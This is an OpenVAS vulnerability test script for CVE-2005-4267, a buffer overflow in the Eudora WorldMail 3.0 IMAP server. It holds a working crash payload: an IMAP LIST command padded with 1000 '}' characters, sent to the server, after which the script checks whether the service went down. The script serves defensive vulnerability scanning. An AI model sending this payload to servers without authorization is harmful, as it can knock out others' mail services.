###############################################################################
# OpenVAS Vulnerability Test
#
# Eudora WorldMail IMAP Server Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802294");
  script_version("2022-04-27T12:01:52+0000");
  script_cve_id("CVE-2005-4267");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-04-27 12:01:52 +0000 (Wed, 27 Apr 2022)");
  script_tag(name:"creation_date", value:"2012-01-18 14:14:14 +0530 (Wed, 18 Jan 2012)");
  script_name("Eudora WorldMail IMAP Server Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("imap4_banner.nasl");
  script_require_ports("Services/imap", 143);
  script_mandatory_keys("imap/eudora/worldmail/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/17640");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/15980");
  script_xref(name:"URL", value:"http://securitytracker.com/id/1015391");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18354");
  script_xref(name:"URL", value:"http://www.idefense.com/intelligence/vulnerabilities/display.php?id=359");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
  arbitrary code within the context of the application or cause a denial of service condition.");

  script_tag(name:"affected", value:"Eudora WorldMail Server 3.0.");

  script_tag(name:"insight", value:"The flaw is due to a boundary error when processing user
  supplied IMAP commands. This can be exploited to cause a stack-based overflow
  via a long string containing a '}' character.");

  script_tag(name:"solution", value:"Upgrade to Eudora WorldMail Server version 4.0 or later.");

  script_tag(name:"summary", value:"WorldMail IMAP Server is prone to a buffer overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("imap_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = imap_get_port(default:143);
banner = imap_get_banner(port:port);

if("WorldMail IMAP4 Server" >!< banner)
  exit(0);

if(!soc = open_sock_tcp(port))
  exit(0);

exploit = string("LIST ", crap(data:"}", length:1000),"\r\n");
send(socket:soc, data:exploit);
close(soc);

sleep(3);

if(!soc1 = open_sock_tcp(port)){
  security_message(port:port);
  exit(0);
}

if(! res = recv(socket:soc1, length:512)){
  security_message(port:port);
  exit(0);
}

close(soc1);
exit(99);
